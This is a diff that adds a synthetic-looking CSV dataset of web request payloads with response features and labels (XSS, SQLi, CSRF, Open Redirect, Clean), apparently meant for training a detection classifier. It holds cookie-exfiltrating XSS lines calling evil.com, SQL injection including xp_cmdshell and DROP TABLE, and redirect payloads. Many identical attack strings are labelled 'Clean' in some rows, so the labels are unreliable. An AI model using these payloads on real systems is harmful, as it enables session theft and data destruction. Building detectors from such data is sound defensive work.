@@ -1,0 +1,851 @@
+payload,response_time,status_code,payload_reflected,error_detected,response_length_diff,label
+?callback=http://attacker.com,97,302,False,False,82,Open Redirect
+<details open ontoggle=alert(1)>,125,200,True,False,89,XSS
+'; EXEC xp_cmdshell('dir') --,262,500,False,True,378,SQLi
+GET /api/v1/status HTTP/1.1,103,200,False,False,75,Clean
+' AND 1=1 --,563,500,False,True,488,SQLi
+' OR 'x'='x,249,200,False,False,545,SQLi
+' OR 1=1#,313,200,True,False,449,Clean
+javascript:alert(1),298,200,True,False,192,XSS
+'-alert(1)-',388,200,False,True,749,Clean
+<iframe src='http://target.com/api/transfer?amount=500'>,84,302,False,False,97,CSRF
+SELECT * FROM products WHERE id = ?,119,200,False,False,11,Clean
+POST /transfer amount=1000&to=attacker,156,302,False,True,55,CSRF
+GET /api/products HTTP/1.1,65,200,True,False,22,Clean
+search=laptop,56,204,False,False,44,Clean
+<img src=1 onerror=this.src='http://evil.com?'+document.cookie>,185,200,True,False,274,XSS
+?forward=http://evil.com,194,302,True,False,16,Open Redirect
+<script>window.location='http://evil.com'</script>,249,200,True,False,190,XSS
+"'; INSERT INTO users VALUES ('hacker','hacked') --",559,200,False,True,501,SQLi
+"fetch('/api/user/delete', {method:'POST'})",122,302,False,False,146,CSRF
+?return=http://phishing.com,75,302,False,False,54,Open Redirect
+<script>alert(1)</script>,208,200,True,False,128,XSS
+<script>alert(1)</script>,146,301,True,False,56,XSS
+<video src=x onerror=alert(1)>,264,200,True,False,215,XSS
+<marquee onstart=alert(1)>,214,200,True,False,298,XSS
+"fetch('/api/user/delete', {method:'POST'})",100,200,False,False,75,CSRF
+GET /home HTTP/1.1,61,200,False,False,63,Clean
+<svg onload=alert(1)>,253,200,True,False,245,XSS
+?return_to=http://attacker.com,100,302,False,True,20,Open Redirect
+<svg onload=alert(1)>,293,200,False,True,222,XSS
+GET /home HTTP/1.1,55,200,False,False,1,Clean
+filter=price_asc&category=books,57,201,False,False,32,Clean
+<script>fetch('http://evil.com?c='+btoa(document.cookie))</script>,230,200,False,False,270,XSS
+GET /home HTTP/1.1,271,403,False,True,350,Clean
+"PUT /api/user/profile {name, bio}",130,200,False,False,52,Clean
+javascript:alert(1),245,200,True,False,135,XSS
+GET /home HTTP/1.1,78,204,False,False,7,Clean
+POST /transfer amount=1000&to=attacker,215,200,True,False,82,CSRF
+"POST /api/login {email, password}",123,200,False,False,49,Clean
+"' AND ascii(substring(username,1,1)) > 64 --",458,500,True,True,722,SQLi
+admin'--,544,500,False,True,488,SQLi
+"<script>fetch('/api/delete',{method:'POST',credentials:'include'})</script>",392,200,True,True,509,Clean
+"' UNION SELECT null, username, password FROM users --",361,500,False,True,305,SQLi
+1 AND 1=1,330,200,False,False,504,SQLi
+<script>document.location='http://evil.com?c='+document.cookie</script>,198,301,True,True,85,XSS
+GET /home HTTP/1.1,135,200,False,False,78,Clean
+<input onfocus=alert(1) autofocus>,228,200,True,False,177,XSS
+?continue=//evil.com/steal,190,301,False,False,99,Open Redirect
+filter=price_asc&category=books,168,204,False,False,35,Clean
+or 1=1,507,301,True,True,549,Clean
+"'; INSERT INTO users VALUES ('hacker','hacked') --",414,200,True,False,292,Clean
+' OR 1=1 LIMIT 1 --,391,500,False,True,778,SQLi
+<script>alert(1)</script>,135,301,True,False,103,XSS
+') OR ('1'='1,380,403,False,True,62,Clean
+"POST /api/login {email, password}",139,200,True,False,131,Clean
+"'; INSERT INTO users VALUES ('hacker','hacked') --",482,403,False,False,747,SQLi
+email=user@example.com,74,200,False,False,38,Clean
+?forward=http://evil.com,84,301,False,False,67,Open Redirect
+POST /transfer amount=1000&to=attacker,100,200,True,False,50,CSRF
+<script>window.location='http://evil.com'</script>,171,200,True,False,215,XSS
+GET /dashboard HTTP/1.1,114,200,False,False,8,Clean
+' GROUP BY columnnames HAVING 1=1 --,227,500,False,True,668,SQLi
+<form action='http://target.com/transfer' method='POST'>,108,302,False,False,100,CSRF
+GET /dashboard HTTP/1.1,155,200,False,False,27,Clean
+"' UNION SELECT null, username, password FROM users --",345,500,True,False,577,Clean
+?dest=http://attacker.com/phish,110,301,False,False,47,Open Redirect
+<input onfocus=alert(1) autofocus>,146,200,True,False,138,XSS
+<iframe src=javascript:alert(1)>,287,200,True,False,63,XSS
+page=2&limit=10,173,201,False,False,29,Clean
+'-alert(1)-',289,200,True,False,179,XSS
+<a href=javascript:alert(1)>click</a>,123,200,True,False,163,XSS
+' OR pg_sleep(5) --,389,500,False,True,604,SQLi
+1; SELECT * FROM information_schema.tables,231,200,False,False,103,Clean
+' UNION SELECT table_name FROM information_schema.tables --,234,500,False,True,749,SQLi
+page=2&limit=10,163,200,False,False,20,Clean
+username=john&password=pass123,66,200,False,False,17,Clean
+<object data=javascript:alert(1)>,106,301,True,False,270,XSS
+or 1=1,280,200,False,True,222,SQLi
+POST /api/update-profile no-csrf-token,157,200,True,False,18,CSRF
+auto-submit form without CSRF token,205,403,False,False,70,CSRF
+"""><img src=x onerror=alert(1)>",221,200,True,False,212,XSS
+' OR '1'='1,57,200,False,False,245,Clean
+<iframe src=javascript:alert(1)>,110,200,True,False,114,XSS
+' AND 1=1 --,204,500,False,True,676,SQLi
+<a href='http://target.com/logout'>click</a>,170,302,False,False,11,CSRF
+"' AND ascii(substring(username,1,1)) > 64 --",451,403,False,True,401,SQLi
+?location=http://attacker.com,77,302,False,True,67,Open Redirect
+"1 UNION ALL SELECT NULL,NULL,NULL --",473,200,False,True,214,SQLi
+?target=//evil.com/fake-login,424,301,False,True,459,Clean
+POST /transfer amount=1000&to=attacker,240,500,True,True,366,Clean
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9,142,200,False,False,75,Clean
+"<script>fetch('/api/delete',{method:'POST',credentials:'include'})</script>",127,200,False,False,24,CSRF
+email=user@example.com,53,201,False,False,1,Clean
+' OR 1=1 --,199,403,True,True,128,Clean
+DELETE /api/cart/item/42,115,200,False,False,58,Clean
+1; SELECT * FROM information_schema.tables,369,200,False,False,619,SQLi
+' OR 1=1#,248,403,True,False,677,SQLi
+GET /api/products HTTP/1.1,114,200,False,False,62,Clean
+<object data=javascript:alert(1)>,180,200,True,False,256,XSS
+<div style=background:url(javascript:alert(1))>,216,200,True,False,101,XSS
+' OR '1'='1,417,403,True,False,332,SQLi
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9,101,200,False,False,61,Clean
+filter=price_asc&category=books,68,204,False,False,44,Clean
+?return_to=http://attacker.com,114,301,False,True,36,Open Redirect
+'; WAITFOR DELAY '0:0:5' --,305,200,False,True,409,SQLi
+'; DROP TABLE users; --,243,403,False,True,326,SQLi
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9,142,200,True,False,4,Clean
+username=john&password=pass123,135,200,False,False,58,Clean
+search=laptop,345,200,True,False,281,Clean
+' AND SLEEP(5) --,335,403,False,True,728,SQLi
+search=laptop,127,200,False,False,56,Clean
+<img src=1 onerror=this.src='http://evil.com?'+document.cookie>,203,200,True,False,190,XSS
+'-alert(1)-',210,200,True,False,183,XSS
+<form method=POST action=/api/change-email>,137,200,False,False,25,CSRF
+Content-Type: application/json,60,201,False,False,43,Clean
+"""><img src=x onerror=alert(1)>",251,200,True,False,74,XSS
+<img src=1 onerror=this.src='http://evil.com?'+document.cookie>,152,200,True,False,122,XSS
+"' AND substring(username,1,1)='a",526,500,False,False,253,SQLi
+XMLHttpRequest POST /api/password/change,113,302,True,False,133,CSRF
+<iframe src=javascript:alert(1)>,244,200,True,False,53,XSS
+<a href=javascript:alert(1)>click</a>,138,200,True,False,229,XSS
+filter=price_asc&category=books,100,200,False,False,63,Clean
+?location=http://attacker.com,137,301,False,False,35,Open Redirect
+admin'--,388,500,False,True,773,SQLi
+"' AND 1=2 UNION SELECT 1,2,3 --",441,500,False,True,523,SQLi
+?next=http://evil.com,139,302,False,False,96,Open Redirect
+<table background=javascript:alert(1)>,325,200,True,False,719,Clean
+<body onload=alert('XSS')>,130,200,True,False,116,XSS
+<object data=javascript:alert(1)>,257,200,True,False,115,XSS
+?goto=http://malicious.com,88,301,True,False,64,Open Redirect
+<div style=background:url(javascript:alert(1))>,180,200,True,False,286,XSS
+'; WAITFOR DELAY '0:0:5' --,387,500,False,True,635,SQLi
+"' UNION SELECT null, username, password FROM users --",126,200,False,False,138,Clean
+POST /admin/create-user from external origin,326,403,False,True,249,Clean
+<a href=javascript:alert(1)>click</a>,107,200,False,False,208,XSS
+?return=http://phishing.com,155,301,False,False,77,Open Redirect
+cross-origin POST request no SameSite cookie,239,302,False,False,95,CSRF
+' AND SLEEP(5) --,414,500,True,True,496,SQLi
+'; EXEC xp_cmdshell('dir') --,530,500,False,True,495,SQLi
+"PUT /api/user/profile {name, bio}",70,200,False,False,10,Clean
+"1 UNION ALL SELECT NULL,NULL,NULL --",369,500,False,True,617,SQLi
+<img src=x onerror=alert(1)>,131,301,True,True,129,XSS
+"' AND substring(username,1,1)='a",430,403,False,True,262,SQLi
+<script>alert(1)</script>,205,200,True,False,283,XSS
+<form method=POST action=/api/change-email>,364,200,True,True,183,Clean
+"' AND 1=2 UNION SELECT 1,2,3 --",435,200,False,True,214,SQLi
+"PUT /api/user/profile {name, bio}",153,204,False,False,56,Clean
+?callback=http://attacker.com,173,302,False,False,17,Open Redirect
+cross-origin POST request no SameSite cookie,224,302,False,False,137,CSRF
+<video src=x onerror=alert(1)>,111,200,True,False,198,XSS
+' OR 1=1#,550,500,False,True,228,SQLi
+' OR 1=1 LIMIT 1 --,397,500,True,True,670,SQLi
+<img src=1 onerror=this.src='http://evil.com?'+document.cookie>,234,200,True,False,150,XSS
+?continue=//evil.com/steal,69,301,True,False,32,Open Redirect
+?redirect=//evil.com,560,200,False,False,72,Clean
+DELETE /api/cart/item/42,587,301,False,True,367,Clean
+?target=//evil.com/fake-login,150,302,False,False,69,Open Redirect
+' AND SLEEP(5) --,599,500,False,False,667,Clean
+"<script>fetch('/api/delete',{method:'POST',credentials:'include'})</script>",166,302,False,False,30,CSRF
+"POST /api/login {email, password}",64,201,False,False,41,Clean
+?next=http://evil.com,140,302,False,False,83,Open Redirect
+filter=price_asc&category=books,124,200,False,True,78,Clean
+?goto=http://malicious.com,136,301,False,False,36,Open Redirect
+?redirect_uri=http://evil.com,98,302,False,False,2,Open Redirect
+?location=http://attacker.com,126,302,True,False,56,Open Redirect
+') OR ('1'='1,302,500,True,True,241,SQLi
+<body background=javascript:alert(1)>,135,200,True,False,198,XSS
+admin'--,440,500,False,True,657,SQLi
+<img src=x onerror=alert(1)>,288,200,True,False,292,XSS
+' OR '1'='1,214,200,False,True,443,SQLi
+<a href=javascript:alert(1)>click</a>,178,200,True,False,173,XSS
+<details open ontoggle=alert(1)>,111,200,True,False,179,XSS
+<script>document.location='http://evil.com?c='+document.cookie</script>,230,200,True,False,135,XSS
+<input onfocus=alert(1) autofocus>,139,200,True,False,159,XSS
+'; DROP TABLE users; --,470,500,False,False,578,SQLi
+<input onfocus=alert(1) autofocus>,197,200,False,False,212,XSS
+cross-site request with session cookie,100,200,False,False,55,CSRF
+'-alert(1)-',158,301,True,False,134,XSS
+javascript:alert(1),207,200,True,False,200,XSS
+GET /dashboard HTTP/1.1,81,200,False,False,47,Clean
+"POST /api/login {email, password}",67,200,False,False,0,Clean
+<script>window.location='http://evil.com'</script>,117,200,True,False,795,Clean
+?callback=http://attacker.com,125,302,False,False,93,Open Redirect
+<video src=x onerror=alert(1)>,197,200,True,False,142,XSS
+SELECT * FROM products WHERE id = ?,108,500,True,True,104,Clean
+?continue=//evil.com/steal,156,200,False,False,8,Open Redirect
+GET /home HTTP/1.1,102,200,False,False,18,Clean
+javascript:alert(1),404,403,True,False,493,Clean
+cross-site request with session cookie,248,302,False,False,129,CSRF
+cross-origin POST request no SameSite cookie,105,200,False,False,148,CSRF
+"' AND 1=2 UNION SELECT 1,2,3 --",401,500,False,True,577,SQLi
+' OR 1=1 LIMIT 1 --,545,500,True,False,393,SQLi
+<object data=javascript:alert(1)>,207,200,True,False,268,XSS
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9,215,301,False,False,433,Clean
+<svg onload=alert(1)>,116,200,True,False,54,XSS
+<svg onload=alert(1)>,258,200,True,False,204,XSS
+' UNION SELECT table_name FROM information_schema.tables --,140,403,True,False,183,Clean
+<script>window.location='http://evil.com'</script>,124,200,False,False,186,XSS
+"fetch('/api/user/delete', {method:'POST'})",243,200,False,False,18,CSRF
+1; SELECT * FROM information_schema.tables,413,500,False,True,634,SQLi
+POST /api/update-profile no-csrf-token,166,403,False,False,76,CSRF
+<link rel=stylesheet href=javascript:alert(1)>,175,200,True,True,84,XSS
+?forward=http://evil.com,136,302,False,False,86,Open Redirect
+admin'--,464,500,False,True,329,SQLi
+page=2&limit=10,95,201,False,False,39,Clean
+"POST /api/login {email, password}",160,200,False,False,77,Clean
+?redir=http://evil.com,125,302,False,False,28,Open Redirect
+<a href=javascript:alert(1)>click</a>,124,200,True,False,127,XSS
+<script>document.location='http://evil.com?c='+document.cookie</script>,284,200,False,True,246,Clean
+<body onload=alert('XSS')>,265,200,True,False,87,XSS
+?next=//attacker.com,86,301,False,False,17,Open Redirect
+GET /api/products HTTP/1.1,167,201,False,False,40,Clean
+cross-origin POST request no SameSite cookie,216,200,False,False,26,CSRF
+"'""><script>alert(document.cookie)</script>",173,200,True,False,260,XSS
+<a href='http://target.com/logout'>click</a>,192,403,False,False,67,CSRF
+'; EXEC xp_cmdshell('dir') --,291,403,False,True,268,SQLi
+"1 UNION ALL SELECT NULL,NULL,NULL --",336,500,False,True,318,SQLi
+"POST /api/login {email, password}",145,200,False,False,60,Clean
+auto-submit form without CSRF token,337,500,True,True,653,Clean
+POST /admin/create-user from external origin,139,302,False,False,103,CSRF
+page=2&limit=10,75,200,False,False,61,Clean
+?return=http://phishing.com,69,301,False,False,48,Open Redirect
+?next=//attacker.com,483,403,False,True,463,Clean
+GET /api/products HTTP/1.1,92,500,True,True,692,Clean
+javascript:alert(1),113,200,True,True,152,XSS
+<video src=x onerror=alert(1)>,155,200,True,False,275,XSS
+username=john&password=pass123,96,200,False,False,15,Clean
+' AND 1=1 --,529,500,False,True,27,Clean
+or 1=1,436,500,False,False,200,SQLi
+<link rel=stylesheet href=javascript:alert(1)>,123,200,False,True,471,Clean
+' OR 1=1#,243,500,True,True,651,SQLi
+XMLHttpRequest POST /api/password/change,188,200,False,False,86,CSRF
+filter=price_asc&category=books,73,200,False,False,2,Clean
+<video src=x onerror=alert(1)>,432,200,True,True,608,Clean
+1; SELECT * FROM information_schema.tables,587,200,True,True,286,SQLi
+1' ORDER BY 3 --,201,200,False,True,595,SQLi
+<form method=POST action=/api/change-email>,243,302,False,False,77,CSRF
+' OR 1=1#,371,500,False,True,340,SQLi
+1' ORDER BY 3 --,506,500,False,True,716,SQLi
+<script>eval(atob('YWxlcnQoMSk='))</script>,289,200,True,False,74,XSS
+' GROUP BY columnnames HAVING 1=1 --,589,200,False,True,417,SQLi
+<img src='http://target.com/delete?id=1'>,176,403,False,False,42,CSRF
+<marquee onstart=alert(1)>,192,200,True,False,198,XSS
+<body background=javascript:alert(1)>,158,200,True,False,205,XSS
+<iframe src='http://target.com/api/transfer?amount=500'>,197,302,False,False,134,CSRF
+<script>fetch('http://evil.com?c='+btoa(document.cookie))</script>,199,200,True,False,283,XSS
+'; EXEC xp_cmdshell('dir') --,426,200,False,True,231,SQLi
+') OR ('1'='1,503,403,False,True,661,SQLi
+or 1=1,235,200,False,True,512,SQLi
+' AND 1=1 --,228,500,False,True,207,SQLi
+"' UNION SELECT null, username, password FROM users --",452,500,False,True,699,SQLi
+<a href='http://target.com/logout'>click</a>,208,302,False,False,108,CSRF
+"' AND substring(username,1,1)='a",320,200,False,True,484,SQLi
+<body background=javascript:alert(1)>,499,403,True,False,459,Clean
+email=user@example.com,96,201,False,False,28,Clean
+<form method=POST action=/api/change-email>,183,403,True,False,133,CSRF
+' OR pg_sleep(5) --,300,500,True,True,484,SQLi
+"PUT /api/user/profile {name, bio}",60,200,False,False,1,Clean
+POST /api/update-profile no-csrf-token,248,403,False,False,78,CSRF
+or 1=1,417,500,False,True,485,SQLi
+' OR 1=1 LIMIT 1 --,265,500,False,True,463,SQLi
+' OR 1=1#,220,500,False,True,331,SQLi
+?location=http://attacker.com,55,302,False,False,40,Open Redirect
+?next=//attacker.com,185,301,True,False,37,Open Redirect
+' OR 1=1 LIMIT 1 --,459,200,False,True,659,SQLi
+?target=//evil.com/fake-login,137,302,False,False,43,Open Redirect
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9,125,200,False,False,37,Clean
+?redirect_uri=http://evil.com,453,403,True,True,112,Clean
+' GROUP BY columnnames HAVING 1=1 --,592,200,False,False,789,SQLi
+<img src=1 onerror=this.src='http://evil.com?'+document.cookie>,169,200,True,False,192,XSS
+<script>new Image().src='http://evil.com?c='+document.cookie</script>,108,200,True,False,242,XSS
+<img src=1 onerror=this.src='http://evil.com?'+document.cookie>,179,301,True,False,60,XSS
+<svg onload=alert(1)>,109,200,True,True,193,XSS
+') OR ('1'='1,559,500,False,False,414,SQLi
+GET /api/products HTTP/1.1,82,200,False,False,65,Clean
+<iframe src='http://target.com/api/transfer?amount=500'>,115,302,False,False,129,CSRF
+XMLHttpRequest POST /api/password/change,128,200,False,False,28,CSRF
+' OR 'x'='x,443,200,True,False,395,SQLi
+?redirect_uri=http://evil.com,154,301,True,False,90,Open Redirect
+1; SELECT * FROM information_schema.tables,328,500,True,True,546,SQLi
+<details open ontoggle=alert(1)>,197,301,True,True,278,XSS
+' OR 1=1#,545,403,False,True,610,SQLi
+page=2&limit=10,97,200,False,False,61,Clean
+?callback=http://attacker.com,483,500,True,True,270,Clean
+auto-submit form without CSRF token,231,200,False,False,143,CSRF
+"1 UNION ALL SELECT NULL,NULL,NULL --",476,500,False,True,590,SQLi
+"""><img src=x onerror=alert(1)>",271,200,True,False,240,XSS
+"1 UNION ALL SELECT NULL,NULL,NULL --",353,200,False,True,298,Clean
+<video src=x onerror=alert(1)>,252,200,False,False,187,XSS
+' OR '1'='1,288,500,False,True,460,SQLi
+<marquee onstart=alert(1)>,158,200,True,False,280,XSS
+<body onload=alert('XSS')>,163,301,False,True,569,Clean
+?url=http://phishing.com,50,301,False,False,82,Open Redirect
+<script>fetch('http://evil.com?c='+btoa(document.cookie))</script>,253,200,True,False,140,XSS
+<body background=javascript:alert(1)>,260,200,True,False,107,XSS
+?return=http://phishing.com,66,301,False,False,69,Open Redirect
+<form action='http://target.com/transfer' method='POST'>,180,200,False,False,66,CSRF
+<iframe src='http://target.com/api/transfer?amount=500'>,96,200,False,False,32,CSRF
+"' AND substring(username,1,1)='a",508,500,True,True,424,SQLi
+SELECT * FROM products WHERE id = ?,160,200,False,False,29,Clean
+POST /transfer amount=1000&to=attacker,222,302,False,False,39,CSRF
+1; SELECT * FROM information_schema.tables,470,500,False,True,495,SQLi
+' OR pg_sleep(5) --,566,500,True,True,210,SQLi
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9,171,200,False,False,21,Clean
+javascript:alert(1),286,200,True,False,174,XSS
+<table background=javascript:alert(1)>,143,200,True,False,200,XSS
+?goto=http://malicious.com,155,302,False,False,33,Open Redirect
+"fetch('/api/user/delete', {method:'POST'})",219,200,False,False,17,CSRF
+') OR ('1'='1,539,500,False,True,699,SQLi
+<table background=javascript:alert(1)>,269,200,True,True,216,XSS
+?redirect=//evil.com,199,302,False,False,22,Open Redirect
+<table background=javascript:alert(1)>,124,200,True,False,229,XSS
+auto-submit form without CSRF token,173,200,False,False,23,CSRF
+username=john&password=pass123,103,200,False,False,50,Clean
+cross-site request with session cookie,148,302,False,False,56,CSRF
+'-alert(1)-',214,200,True,False,213,XSS
+<form action='http://target.com/transfer' method='POST'>,193,200,True,False,62,CSRF
+?next=//attacker.com,64,200,False,False,59,Open Redirect
+' OR '1'='1,261,200,True,True,287,SQLi
+?redirect=//evil.com,88,301,False,False,99,Open Redirect
+"' AND substring(username,1,1)='a",400,200,False,True,370,Clean
+' UNION SELECT table_name FROM information_schema.tables --,370,500,False,True,548,SQLi
+<table background=javascript:alert(1)>,186,200,True,False,207,XSS
+?return_to=http://attacker.com,121,301,False,False,11,Open Redirect
+' OR 1=1 --,553,500,True,True,232,Clean
+"1 UNION ALL SELECT NULL,NULL,NULL --",509,500,False,True,555,SQLi
+' UNION SELECT table_name FROM information_schema.tables --,591,200,False,True,379,SQLi
+<a href='http://target.com/logout'>click</a>,130,200,True,False,122,CSRF
+<form method=POST action=/api/change-email>,166,403,False,False,48,CSRF
+"' AND 1=2 UNION SELECT 1,2,3 --",544,500,False,False,585,SQLi
+' AND 1=1 --,362,403,False,True,700,SQLi
+<script>document.location='http://evil.com?c='+document.cookie</script>,161,200,True,False,175,XSS
+"'; INSERT INTO users VALUES ('hacker','hacked') --",566,500,False,False,570,SQLi
+<img src=1 onerror=this.src='http://evil.com?'+document.cookie>,491,500,False,True,699,Clean
+' AND 1=1 --,407,200,False,True,381,SQLi
+POST /api/update-profile no-csrf-token,204,301,False,True,536,Clean
+<iframe src=javascript:alert(1)>,482,200,False,False,287,Clean
+"""><img src=x onerror=alert(1)>",586,200,False,False,695,Clean
+?dest=http://attacker.com/phish,125,301,False,True,89,Open Redirect
+?callback=http://attacker.com,196,301,True,False,88,Open Redirect
+1' ORDER BY 3 --,479,500,False,True,508,SQLi
+' OR pg_sleep(5) --,287,200,False,True,494,SQLi
+<object data=javascript:alert(1)>,174,200,True,True,251,Clean
+"' AND substring(username,1,1)='a",330,500,False,True,721,SQLi
+"'; INSERT INTO users VALUES ('hacker','hacked') --",519,200,False,True,797,SQLi
+<body onload=alert('XSS')>,156,200,True,True,211,XSS
+"'; INSERT INTO users VALUES ('hacker','hacked') --",359,403,False,True,527,SQLi
+Content-Type: application/json,135,200,False,False,59,Clean
+?redirect=//evil.com,117,301,False,False,75,Open Redirect
+SELECT * FROM products WHERE id = ?,66,201,False,False,7,Clean
+username=john&password=pass123,139,200,True,False,57,Clean
+"' UNION SELECT null, username, password FROM users --",483,500,False,True,487,SQLi
+?next=http://evil.com,474,301,True,False,629,Clean
+?location=http://attacker.com,162,302,False,False,72,Open Redirect
+'; DROP TABLE users; --,333,500,False,True,277,SQLi
+?redir=http://evil.com,58,301,False,False,6,Open Redirect
+search=laptop,75,200,False,False,2,Clean
+?next=http://evil.com,70,302,True,False,20,Open Redirect
+<details open ontoggle=alert(1)>,197,200,True,False,229,XSS
+?dest=http://attacker.com/phish,98,302,False,False,15,Open Redirect
+javascript:alert(1),182,200,True,False,227,XSS
+?next=http://evil.com,142,302,False,False,46,Open Redirect
+or 1=1,351,500,False,True,774,SQLi
+"' UNION SELECT null, username, password FROM users --",306,500,True,True,277,SQLi
+<a href='http://target.com/logout'>click</a>,218,403,False,False,125,CSRF
+<input onfocus=alert(1) autofocus>,267,200,True,True,56,XSS
+form submit missing X-CSRF-Token header,131,403,False,False,117,CSRF
+POST /transfer amount=1000&to=attacker,89,403,False,False,134,CSRF
+<script>alert(1)</script>,116,200,True,True,276,XSS
+<link rel=stylesheet href=javascript:alert(1)>,293,200,True,False,116,XSS
+Content-Type: application/json,150,200,False,False,66,Clean
+cross-site request with session cookie,191,200,False,False,140,CSRF
+<input onfocus=alert(1) autofocus>,144,200,False,False,248,XSS
+<script>eval(atob('YWxlcnQoMSk='))</script>,286,200,False,False,260,XSS
+SELECT * FROM products WHERE id = ?,151,200,False,False,57,Clean
+' AND SLEEP(5) --,414,500,False,True,601,SQLi
+<script>eval(atob('YWxlcnQoMSk='))</script>,216,200,True,False,265,XSS
+'; WAITFOR DELAY '0:0:5' --,585,500,False,False,397,SQLi
+<input onfocus=alert(1) autofocus>,250,200,True,False,152,XSS
+<body background=javascript:alert(1)>,139,200,True,False,124,XSS
+XMLHttpRequest POST /api/password/change,517,200,True,True,471,Clean
+"POST /api/login {email, password}",129,200,False,False,75,Clean
+page=2&limit=10,167,200,True,True,686,Clean
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9,65,200,False,False,66,Clean
+'-alert(1)-',297,200,True,False,264,XSS
+email=user@example.com,113,200,False,False,37,Clean
+"'""><script>alert(document.cookie)</script>",136,200,True,False,253,XSS
+<div style=background:url(javascript:alert(1))>,184,200,True,True,150,XSS
+"' AND substring(username,1,1)='a",252,200,False,True,630,SQLi
+form submit missing X-CSRF-Token header,227,403,False,False,129,CSRF
+<svg onload=alert(1)>,464,200,False,False,268,Clean
+?redir=http://evil.com,141,301,True,False,16,Open Redirect
+<img src=1 onerror=this.src='http://evil.com?'+document.cookie>,212,200,True,False,287,XSS
+' AND SLEEP(5) --,530,500,True,True,381,SQLi
+GET /dashboard HTTP/1.1,171,200,False,False,12,Clean
+DELETE /api/cart/item/42,141,200,False,False,48,Clean
+"' UNION SELECT null, username, password FROM users --",551,500,False,True,463,SQLi
+' OR 1=1 --,390,500,True,True,523,SQLi
+?next=http://evil.com,169,200,True,False,64,Open Redirect
+?target=//evil.com/fake-login,101,301,False,False,9,Open Redirect
+<svg onload=alert(1)>,125,200,True,False,213,XSS
+"' AND substring(username,1,1)='a",587,500,False,True,562,SQLi
+?return=http://phishing.com,116,200,True,False,72,Open Redirect
+' UNION SELECT table_name FROM information_schema.tables --,389,500,False,False,350,SQLi
+<body background=javascript:alert(1)>,206,200,True,False,59,XSS
+email=user@example.com,175,200,True,False,19,Clean
+?goto=http://malicious.com,87,302,False,False,12,Open Redirect
+<a href=javascript:alert(1)>click</a>,227,200,True,False,109,XSS
+' UNION SELECT table_name FROM information_schema.tables --,412,200,False,True,619,SQLi
+GET /api/products HTTP/1.1,157,200,False,False,6,Clean
+"'; INSERT INTO users VALUES ('hacker','hacked') --",460,500,False,True,484,SQLi
+' OR 1=1 --,232,500,False,True,541,SQLi
+Content-Type: application/json,57,200,False,False,9,Clean
+<script>fetch('http://evil.com?c='+btoa(document.cookie))</script>,154,200,True,False,218,XSS
+<object data=javascript:alert(1)>,141,200,True,False,293,XSS
+' OR 1=1 --,302,500,True,True,364,SQLi
+filter=price_asc&category=books,143,500,True,False,86,Clean
+form submit missing X-CSRF-Token header,208,302,False,False,117,CSRF
+email=user@example.com,137,200,False,False,34,Clean
+<script>new Image().src='http://evil.com?c='+document.cookie</script>,240,200,True,False,264,XSS
+?dest=http://attacker.com/phish,60,302,True,False,99,Open Redirect
+' OR '1'='1,247,200,False,True,675,SQLi
+"'""><script>alert(document.cookie)</script>",128,200,False,False,144,XSS
+DELETE /api/cart/item/42,71,200,False,False,35,Clean
+' OR 'x'='x,578,500,False,True,376,SQLi
+"'""><script>alert(document.cookie)</script>",285,301,True,False,259,XSS
+?dest=http://attacker.com/phish,196,301,True,False,98,Open Redirect
+"fetch('/api/user/delete', {method:'POST'})",107,200,True,False,93,CSRF
+"fetch('/api/user/delete', {method:'POST'})",232,403,False,False,128,CSRF
+<script>eval(atob('YWxlcnQoMSk='))</script>,280,200,True,True,74,XSS
+<marquee onstart=alert(1)>,201,200,True,False,209,XSS
+?forward=http://evil.com,103,301,False,False,87,Open Redirect
+1' ORDER BY 3 --,482,500,False,True,217,SQLi
+search=laptop,61,200,False,False,50,Clean
+?dest=http://attacker.com/phish,104,301,False,False,10,Open Redirect
+'; WAITFOR DELAY '0:0:5' --,548,500,False,True,217,Clean
+GET /api/products HTTP/1.1,151,200,False,False,56,Clean
+<video src=x onerror=alert(1)>,181,200,False,False,227,XSS
+<marquee onstart=alert(1)>,163,200,True,False,255,XSS
+?redir=http://evil.com,188,200,False,False,12,Open Redirect
+<details open ontoggle=alert(1)>,160,200,True,False,145,XSS
+auto-submit form without CSRF token,199,302,False,False,137,CSRF
+javascript:alert(1),141,200,False,False,80,XSS
+SELECT * FROM products WHERE id = ?,143,200,False,False,36,Clean
+"' AND ascii(substring(username,1,1)) > 64 --",220,500,False,True,358,SQLi
+<script>eval(atob('YWxlcnQoMSk='))</script>,125,200,True,False,164,XSS
+<body background=javascript:alert(1)>,266,200,True,False,278,XSS
+DELETE /api/cart/item/42,144,200,False,False,49,Clean
+<a href=javascript:alert(1)>click</a>,237,200,True,False,198,XSS
+' GROUP BY columnnames HAVING 1=1 --,432,200,True,True,713,SQLi
+"' AND 1=2 UNION SELECT 1,2,3 --",389,200,True,False,669,Clean
+GET /home HTTP/1.1,139,200,False,False,66,Clean
+') OR ('1'='1,543,200,False,True,617,SQLi
+' AND SLEEP(5) --,539,403,False,True,482,SQLi
+GET /home HTTP/1.1,94,200,False,False,57,Clean
+form submit missing X-CSRF-Token header,184,200,False,False,73,CSRF
+' OR 1=1 --,356,500,False,True,774,SQLi
+POST /admin/create-user from external origin,239,302,False,False,47,CSRF
+?dest=http://attacker.com/phish,175,302,False,False,7,Open Redirect
+1 AND 1=1,348,500,True,True,146,Clean
+GET /dashboard HTTP/1.1,62,301,False,False,687,Clean
+?redirect=//evil.com,176,301,True,False,18,Open Redirect
+"' AND 1=2 UNION SELECT 1,2,3 --",227,500,False,True,319,SQLi
+<body onload=alert('XSS')>,139,200,True,False,61,XSS
+?redirect_uri=http://evil.com,199,302,True,False,24,Open Redirect
+') OR ('1'='1,252,500,False,True,294,SQLi
+?goto=http://malicious.com,113,500,True,False,9,Clean
+"1 UNION ALL SELECT NULL,NULL,NULL --",241,500,True,True,701,SQLi
+"1 UNION ALL SELECT NULL,NULL,NULL --",467,500,False,True,347,SQLi
+filter=price_asc&category=books,144,200,False,False,70,Clean
+username=john&password=pass123,88,200,False,False,21,Clean
+'; EXEC xp_cmdshell('dir') --,327,200,False,False,668,SQLi
+?forward=http://evil.com,60,200,True,False,20,Open Redirect
+' OR 1=1 --,587,200,False,True,356,SQLi
